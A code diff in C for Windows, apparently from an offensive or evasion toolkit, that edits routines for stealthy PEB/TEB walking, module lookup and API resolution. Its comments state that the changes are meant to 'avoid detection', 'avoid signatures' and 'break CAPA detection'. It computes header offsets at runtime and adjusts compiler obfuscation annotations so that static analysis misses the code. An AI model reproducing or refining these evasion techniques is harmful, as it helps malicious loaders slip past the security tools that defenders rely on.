@@ -23,7 +23,7 @@ static BOOL is_valid_teb(PTEB teb) {
 
 // Method 1: TEB self-reference (Primary - Fast & Stealthy)
 // Uses gs:0x30 instead of gs:0x60 to avoid detection
-__attribute__((__annotate__(("substitution,linearmba"))))
+__attribute__((__annotate__(("substitution"))))
 PTEB get_teb_self_reference() {
     // Calculate offset 0x30 at runtime to avoid signatures
     DWORD64 teb_self_offset = (0x18 << 1) | 0x10;  // = 0x30
@@ -39,7 +39,7 @@ PTEB get_teb_self_reference() {
 }
 
 // Main function: Cascading fallback for maximum reliability
-__attribute__((__annotate__(("substitution,linearmba,indirectcall"))))
+__attribute__((__annotate__(("substitution,indirectcall"))))
 PPEB get_peb_stealth() {
     PTEB teb = NULL;
 
@@ -55,7 +55,7 @@ PPEB get_peb_stealth() {
     return NULL;
 }
 
-__attribute__((__annotate__(("substitution,linearmba,indirectcall"))))
+__attribute__((__annotate__(("substitution,indirectcall"))))
 PBYTE ldr_find_module(PPEB_LDR_DATA ldr, PCHAR target_module_name) {
     PLIST_ENTRY linked_lst = &ldr->InLoadOrderModuleList;
     PLIST_ENTRY curr       = linked_lst->Flink;
@@ -78,7 +78,7 @@ PBYTE ldr_find_module(PPEB_LDR_DATA ldr, PCHAR target_module_name) {
     return NULL;
 }
 
-__attribute__((__annotate__(("substitution,linearmba"))))
+__attribute__((__annotate__(("substitution"))))
 PHASHMAP init_function_map() {
     PHASHMAP func_map = hashmap_create(PEB_WALK_HASH_MAP_SIZE);
 
@@ -90,18 +90,22 @@ PHASHMAP init_function_map() {
     return func_map;
 }
 
-__attribute__((__annotate__(("flatten,substitution,linearmba,indirectcall,aliasaccess"))))
+__attribute__((__annotate__(("substitution,indirectcall"))))
 VOID resolv_functions(PHASHMAP func_map, PBYTE dllbaseaddr){
 
-    PIMAGE_DOS_HEADER img_dos_header      = (PIMAGE_DOS_HEADER)dllbaseaddr;
+    // Obfuscate offset 0x3C (e_lfanew) - breaks CAPA detection
+    DWORD lfanew_offset = (0x1E << 1);  // 0x3C calculated at runtime
+    DWORD pe_offset = *(DWORD*)(dllbaseaddr + lfanew_offset);
 
-     // Vérifier la signature DOS "MZ"
+    PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)dllbaseaddr;
+
+    // Vérifier la signature DOS "MZ"
     if (img_dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
         _inf("Invalid DOS signature");
         return;
     }
 
-    PIMAGE_NT_HEADERS img_header          = (PIMAGE_NT_HEADERS)((PBYTE)dllbaseaddr + img_dos_header->e_lfanew);
+    PIMAGE_NT_HEADERS img_header = (PIMAGE_NT_HEADERS)(dllbaseaddr + pe_offset);
 
     // Vérifier la signature PE "PE\0\0"
     if (img_header->Signature != IMAGE_NT_SIGNATURE) {
@@ -148,7 +152,7 @@ VOID resolv_functions(PHASHMAP func_map, PBYTE dllbaseaddr){
     return;
 }
 
-__attribute__((__annotate__(("substitution,linearmba,indirectcall"))))
+__attribute__((__annotate__(("substitution,indirectcall"))))
 BOOL insert_new_dll(PHASHMAP func_map, PCHAR dll_name) {
     if (!func_map || !dll_name) {
         _err("Invalid parameters to insert_new_dll");
